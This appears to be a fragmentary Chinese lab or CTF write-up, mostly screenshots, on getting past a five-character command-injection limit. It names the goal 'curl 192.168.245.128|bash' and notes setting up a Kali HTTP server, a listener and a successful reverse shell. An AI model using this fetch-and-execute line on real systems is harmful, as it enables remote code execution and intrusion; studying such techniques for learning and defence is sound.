...
![](../img/{A6D726BF-4747-48F7-A5A1-2480481F97C5}.png)
**方法**
```
期望执行命令curl 192.168.245.128|bash
1.构造ls -t>y长度明显超过了5
...
![](../img/{4B30823B-8E1A-4B07-9F94-28CDC694139B}.png)
![](../img/{34E954FA-32D8-4C5F-862F-FC063B5FD5E1}.png)
...
→ { | } ~
```
![](../img/{FE22655A-DB7E-4932-9861-ED78B8A1A3CD}%201.png)
...
**kali主机开启http服务**
![](../img/{2E895CB9-1F06-4603-8635-BD484D5FABF1}.png)
访问
![](../img/{69EA44DE-5A0B-4906-968A-D33F59D88215}.png)

**再开启一个监听端口**
![](../img/{5A927302-A9C6-45C7-ADD2-3BD4FF9600C6}.png)


==补充说明==
![](../img/{A84BCB71-1EA4-4D79-8723-B925D92B0E08}.png)
即使_不是ls开头，但只要ls -t>y是完整连贯插入_也是可以执行成功的

**反弹shell成功**
![](../img/{3CDB3BEA-EC9B-43EE-8898-1998AAB11CB7}.png)
